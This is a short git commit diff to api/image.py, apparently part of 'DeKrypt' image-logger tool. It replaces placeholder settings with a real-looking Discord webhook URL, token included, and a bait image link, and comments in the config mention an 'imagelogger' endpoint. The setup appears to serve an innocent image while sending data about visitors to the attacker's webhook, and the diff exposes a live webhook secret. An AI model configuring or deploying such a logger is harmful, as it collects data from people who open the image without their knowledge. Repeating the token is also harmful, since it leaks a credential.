f355123922f36e00383eb27b6618b230031709ee
cbs2icey <cbs2cold@gmail.com>
2025-02-28 04:17:36 -0500

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,8 +13,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1344957368655413269/7ieAtOaGqS26x2qZlDqYgF7wp7hwTV1DJcy1KILepgTGU2xlcK4ZN5cJ89C73QCgXsEy",
+    "image": "https://www.socialnews.xyz/wp-content/uploads/2016/05/13/Blue-Galaxy.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
